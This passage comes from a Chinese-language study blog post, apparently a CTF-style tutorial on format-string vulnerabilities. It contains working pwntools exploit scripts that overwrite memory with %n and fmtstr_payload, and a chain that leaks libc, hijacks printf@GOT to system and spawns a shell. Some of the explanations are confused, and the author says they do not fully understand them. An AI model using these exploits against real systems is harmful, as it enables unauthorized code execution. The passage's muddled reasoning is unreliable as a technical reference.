+<td>转换为整数地址</td>
+<td>主动泄露地址</td>
+</tr>
+<tr>
+<td><code>u32(...)</code></td>
+<td>接收到的是原始 4 字节数据（如<code>b&#39;\xbc\x9d\xa7\xff&#39;</code>）</td>
+<td>将小端序的 4 字节转为整数</td>
+<td>调用泄露地址</td>
+</tr>
+</tbody></table>
+<p>🧩 <code>p32(a_addr)</code> 是怎么用的？</p>
+<p>构造的 <code>p32(a_addr)</code> 会被 <code>printf</code> 当作一个参数处理：</p>
+<ul>
+<li>它被压入栈上；</li>
+<li><code>%8$n</code> 会从第 8 个参数位置读取它；</li>
+<li>这个地址就是写入的目标地址。</li>
+</ul>
+<p>🧩 <code>%12c</code> 是怎么用的？（目标是16，a的地址占四个字节）</p>
+<ul>
+<li><code>%12c</code> 输出 12 个字符（如空格）；</li>
+<li><code>%n</code> 会把当前输出的字符总数写入指定地址；</li>
+<li>所以 <code>%12c</code> 的作用是让 <code>%n</code> 写入 <code>12</code>；</li>
+<li>它本身不写入内存，但会影响 <code>%n</code> 的值。</li>
+</ul>
+<p>不能换成b’a’*12,这个不会影响%n的总数</p>
+<p><strong>工作原理：</strong></p>
+<ol>
+<li>当 <code>printf(payload)</code> 执行时，<code>payload</code> 字符串会被放到栈上。</li>
+<li><code>printf</code> 开始解析 <code>payload</code>。它会把 <code>p32(a_addr)</code> 视为一个普通的字符串（但它实际上是 <code>v1</code> 的地址）。</li>
+<li>然后遇到 <code>%12c</code>，它输出 12 个字符。</li>
+<li>接着遇到 <code>%8$n</code>。此时 <code>printf</code> 已经输出了 12 个字符。它会去栈上寻找第 8 个参数的地址。由于 <code>p32(a_addr)</code> 放在了 payload 的开头，并且其长度是 4 字节，它会正好落在栈上第 8 个参数的位置上（这个偏移量是经过调试确定的）。</li>
+<li><code>printf</code> 会将当前已输出的字符数 <code>12</code> <strong>写入</strong>到 <code>p32(a_addr)</code> 所表示的地址，也就是局部变量 <code>v1</code> 的地址。</li>
+<li>最终，<code>v1</code> 的值被修改为 <code>12</code>。</li>
+</ol>
+<h4 id="b的处理（全局小数）"><a href="#b的处理（全局小数）" class="headerlink" title="b的处理（全局小数）"></a>b的处理（全局小数）</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721202346937.png" alt="image-20250721202346937"></p>
+<p>b,c的地址可以直接找到</p>
+<p><strong>脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./overwrite&quot;)</span><br><span class="line">elf = ELF(&quot;./overwrite&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b printf&quot;)</span><br><span class="line">a=int(p.recvuntil(&quot;\n&quot;,drop=True),16)</span><br><span class="line">print(hex(a))</span><br><span class="line">b=0x0804A028</span><br><span class="line">payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">info=p.recvline()</span><br><span class="line">if b&quot;overwrite b for a small value&quot; in info:</span><br><span class="line">  print(b&quot;Success\n&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么不能按照覆盖 <code>a</code> 的方法？</strong>（因为%n，b的地址已经超过2了，所以b的地址只能在%_$n之后）</p>
+<ol>
+<li><strong>偏移量计算的差异</strong>： 在覆盖 <code>a</code> 的方法中，<code>p32(a_addr)</code> 放在了 payload 的最开头，并且 <code>printf</code> 发现这个开头在它的参数列表中是<strong>第 8 个</strong>。 但是，如果将 <code>p32(b_addr)</code> 也放在 payload 的开头并尝试用 <code>%8$n</code> 写入，可能会遇到问题：<ul>
+<li><strong>地址值与格式符冲突</strong>：<code>0x0804A028</code> 这个地址本身如果被 <code>printf</code> 解析成格式化字符串的一部分，可能会包含 <code>%</code> 或其他特殊字符，导致 <code>printf</code> 崩溃或行为异常。例如，地址的某个字节可能被解释为 <code>%s</code> 或 <code>%x</code> 的一部分，导致 <code>printf</code> 试图读取无效的内存地址。</li>
+<li><strong>控制性问题</strong>：我们通常希望将要写入的地址放在格式字符串的末尾，这样它就不会被 <code>printf</code> 误认为是格式符的一部分来处理，而只是一个普通的 4 字节数据。</li>
+</ul>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>覆盖 <code>v1</code> (局部变量)</th>
+<th>覆盖 <code>b</code> (全局变量)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>目标类型</strong></td>
+<td>栈上的局部变量</td>
+<td>数据段上的全局变量</td>
+</tr>
+<tr>
+<td><strong>地址来源</strong></td>
+<td>运行时泄露 (每次可能不同)</td>
+<td>静态固定 (编译时确定)</td>
+</tr>
+<tr>
+<td><strong><code>p32(addr)</code> 位置</strong></td>
+<td>放在 <code>payload</code> 的<strong>开头</strong></td>
+<td>放在 <code>payload</code> 的<strong>末尾</strong></td>
+</tr>
+<tr>
+<td><strong><code>%n</code> 偏移</strong></td>
+<td><code>8$</code> (因为地址放在开头，且在第 8 个参数位置)</td>
+<td><code>10$</code> (因为地址放在末尾，且在第 10 个参数位置)</td>
+</tr>
+<tr>
+<td><strong>主要考量</strong></td>
+<td>确保 <code>p32(addr)</code> 不被误解为格式符，且在正确偏移</td>
+<td>避免 <code>b_addr</code> 字节被误解为格式符，更稳定地作为参数地址</td>
+</tr>
+</tbody></table>
+<p>好的，如果你确认这个 <code>b</code> 是<strong>必须的</strong>，那么它在 payload 中的存在，就意味着它在栈的布局和 <code>printf</code> 对参数的解析中起到了关键作用，通常是<strong>保证了 <code>p32(b_addr)</code> 的正确对齐，使其落在 <code>%10$n</code> 预期的参数位置</strong>。</p>
+<p>让我们来详细分析，为什么多一个 <code>b</code> 反而可能成为“必须的”。</p>
+<p><strong>有 <code>b</code> 的详细分析</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr)</span><br></pre></td></tr></table></figure>
+
+<p>让我们计算每个部分的长度：</p>
+<ol>
+<li><code>b&quot;aa&quot;</code>：2 字节</li>
+<li><code>b&quot;%10$n&quot;</code>：5 字节</li>
+<li><code>b&quot;b&quot;</code>：1 字节</li>
+<li><code>p32(b_addr)</code>：4 字节 (假设 <code>b_addr</code> 是 <code>0x0804A028</code>)</li>
+</ol>
+<p><strong>总字节数 &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 字节</strong>,在这里，b是为了补足字节</p>
+<h4 id="c的处理（全局大数）"><a href="#c的处理（全局大数）" class="headerlink" title="c的处理（全局大数）"></a>c的处理（全局大数）</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721200707341.png" alt="image-20250721200707341"></p>
+<p>这是一个很大的数，考虑逐字节写入</p>
+<p>这里想把c覆盖为0x12345678，而c的地址是0x0804A02C，所以基本目标是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804A02C:\x78</span><br><span class="line">0x0804A02D:\x56</span><br><span class="line">0x0804A02E:\x34</span><br><span class="line">0x0804A02F:\x12</span><br></pre></td></tr></table></figure>
+
+<p><strong>脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./overwrite&quot;)</span><br><span class="line"></span><br><span class="line">a=int(p.recvuntil(&quot;\n&quot;,drop=True),16)</span><br><span class="line">print(hex(a))</span><br><span class="line"></span><br><span class="line">c=0x0804A02C</span><br><span class="line">payload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">info =p.recvline()</span><br><span class="line">if b&quot;overwrite c for a big value&quot; in info:</span><br><span class="line">  print(b&quot;Success&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p><code>fmtstr_payload</code> 是 <strong>pwntools 提供的一个自动化工具</strong> ，用于<strong>构造格式化字符串漏洞（Format String Vulnerability）的 payload</strong> 。</p>
+<p>它的作用是：</p>
+<blockquote>
+<p><strong>自动计算字符数并构造 payload，用于写入任意地址的值（如 GOT 表、变量、返回地址等）</strong> </p>
+</blockquote>
+<p>🧪 <code>fmtstr_payload</code> 的使用方法</p>
+<ol>
+<li><strong>基本语法</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>参数说明</strong></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>offset</code></td>
+<td>格式化字符串偏移量（你的输入在第几个<code>%p</code>的位置）</td>
+</tr>
+<tr>
+<td><code>writes</code></td>
+<td>一个字典，表示你要写入的地址和值，如<code>&#123;addr1: value1, addr2: value2&#125;</code></td>
+</tr>
+<tr>
+<td><code>numbwritten</code></td>
+<td>已经输出的字符数（默认为 0，可以忽略）</td>
+</tr>
+<tr>
+<td><code>write_size</code></td>
+<td>写入大小，可选：<code>&#39;byte&#39;</code>、<code>&#39;short&#39;</code>、<code>&#39;int&#39;</code>（默认是<code>&#39;byte&#39;</code>）</td>
+</tr>
+</tbody></table>
+<p>🧩 示例 1：写入一个地址为 16</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">offset = 8  # 偏移量</span><br><span class="line">addr = elf.symbols[&#x27;a&#x27;]  # 假设你要写入变量 a 的地址</span><br><span class="line"></span><br><span class="line"># 构造 payload：写入 a = 16</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 16&#125;)</span><br><span class="line"></span><br><span class="line">p = process(&quot;./vuln&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>🧩 示例 2：写入多个地址（如 <code>a=16</code>, <code>b=2</code>, <code>c=0x12345678</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">offset = 8</span><br><span class="line">a_addr = elf.symbols[&#x27;a&#x27;]</span><br><span class="line">b_addr = elf.symbols[&#x27;b&#x27;]</span><br><span class="line">c_addr = elf.symbols[&#x27;c&#x27;]</span><br><span class="line"></span><br><span class="line"># 构造 payload：写入多个地址</span><br><span class="line">writes = &#123;</span><br><span class="line">    a_addr: 16,</span><br><span class="line">    b_addr: 2,</span><br><span class="line">    c_addr: 0x12345678</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)</span><br><span class="line">p = process(&quot;./vuln&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="fmt-demo（格式化字符串的综合利用）"><a href="#fmt-demo（格式化字符串的综合利用）" class="headerlink" title="fmt_demo（格式化字符串的综合利用）"></a>fmt_demo（格式化字符串的综合利用）</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721203303330.png" alt="image-20250721203303330"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721212854956.png" alt="image-20250721212854956"></p>
+<p>所以可以先泄露libc的基址，得到system函数的地址</p>
+<p>太根据此把printf的got表存储的地址换为system函数的地址</p>
+<p>之后输入参数“&#x2F;bin&#x2F;sh”,就可以实现</p>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&quot;./fmt_demo&quot;)</span><br><span class="line">elf=ELF(&quot;./fmt_demo&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">payload=p32(read_got)+b&quot;%4$s&quot;</span><br><span class="line">p.send(payload.ljust(0x100,b&quot;\x00&quot;))</span><br><span class="line">read=u32(p.recv(8)[4:])</span><br><span class="line">print(hex(read))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&quot;read&quot;,read)</span><br><span class="line">libc_base=read-libc.dump(&quot;read&quot;)</span><br><span class="line">system=libc_base+libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)</span><br><span class="line">p.sendline(payload.ljust(0x100,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">bin=b&quot;/bin/sh&quot;</span><br><span class="line">p.sendline(bin.ljust(0x100,b&quot;\x00&quot;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<blockquote>
+<p><strong>那为什么还要填补 payload 的长度为 0x100 字节？”</strong></p>
+</blockquote>
+<p>我们来从 <strong>“payload 被复制到栈上”</strong> 这个现象出发，解释为什么我们<strong>有意地</strong> 将 payload 填充到固定长度（如 0x100 字节），尽管它可能会被复制到栈上。</p>
+<p>✅ 简短回答：</p>
+<blockquote>
+<p><strong>我们填补 payload 到固定长度（如 0x100 字节），是为了让 payload 被完整复制到栈上，从而让偏移固定、布局可控，便于利用格式化字符串漏洞进行地址泄露或写入操作。</strong> </p>
+</blockquote>
+<p>📌 payload 的两种“命运”：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1️⃣ payload 短</td>
+<td>&lt; 一些参数长度</td>
+<td><code>printf</code>从栈上读取参数</td>
+<td>payload 在 buf 中，参数在栈上</td>
+</tr>
+<tr>
+<td>2️⃣ payload 长</td>
+<td>&gt; 一定长度（如 100 字节）</td>
+<td><code>printf</code>把 payload 复制到栈上</td>
+<td>payload 本身就在栈上</td>
+</tr>
+</tbody></table>
+<p>🧩 为什么要“故意”让 payload 被复制到栈上？</p>
+<p>✅ 优点一：<strong>偏移固定，便于调试</strong></p>
+<ul>
+<li>payload 被复制到栈上后，它在栈上的位置是固定的。</li>
+<li>我们可以精准控制偏移（比如 <code>%4$s</code> 就一定读取 payload 中的地址）。</li>
+<li>避免了因 payload 长度不同导致偏移变化的问题。</li>
+</ul>
+<p>✅ 优点二：<strong>便于构造写入操作（如 %n）</strong></p>
+<ul>
+<li>当我们想用 <code>%n</code> 写某个地址时，需要确保地址在栈上，且偏移固定。</li>
+<li>如果 payload 被复制到栈上，我们就可以把地址放在 payload 开头，然后用 <code>%1$n</code> 精准写入。</li>
+</ul>
+<p>✅ 优点三：<strong>防止 payload 被截断或偏移漂移</strong></p>
+<ul>
+<li>如果 payload 长度不固定，可能导致偏移变化，<code>%s</code>、<code>%n</code> 读写错误地址。</li>
+<li>填充到固定长度（如 0x100）可以避免这种漂移。</li>
+</ul>
+<p>:grey_question:但我其实不太理解   </p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">John Doe</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/')">格式化字符串</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=格式化字符串&amp;url=http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/pwn-study/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>pwn_study<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/07/20/HarekazeCTF2019-baby-rop2/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ret2libc-printf</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/" title="初识栈溢出"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-05</div><div class="title">初识栈溢出</div></div></a></div><div><a href="/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/" title="gdb调试"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-16</div><div class="title">gdb调试</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%B1-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.1.</span> <span class="toc-text">🧱 常见的格式化字符串符号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leakmemory-%E6%B3%84%E9%9C%B2%E6%A0%88%E4%B8%8A%E5%86%85%E5%AE%B9"><span class="toc-number">2.1.</span> <span class="toc-text">leakmemory(泄露栈上内容)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leakmemory-%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-number">2.2.</span> <span class="toc-text">leakmemory(泄露任意地址内存)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.1.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">函数调用完整过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overwrite-%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98"><span class="toc-number">2.3.</span> <span class="toc-text">overwrite(覆盖任意地址内存)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%88%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%EF%BC%89"><span class="toc-number">2.3.1.</span> <span class="toc-text">a的处理（局部变量）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%88%E5%85%A8%E5%B1%80%E5%B0%8F%E6%95%B0%EF%BC%89"><span class="toc-number">2.3.2.</span> <span class="toc-text">b的处理（全局小数）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%88%E5%85%A8%E5%B1%80%E5%A4%A7%E6%95%B0%EF%BC%89"><span class="toc-number">2.3.3.</span> <span class="toc-text">c的处理（全局大数）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fmtstr-payload"><span class="toc-number">2.3.4.</span> <span class="toc-text">fmtstr_payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt-demo%EF%BC%88%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">2.4.</span> <span 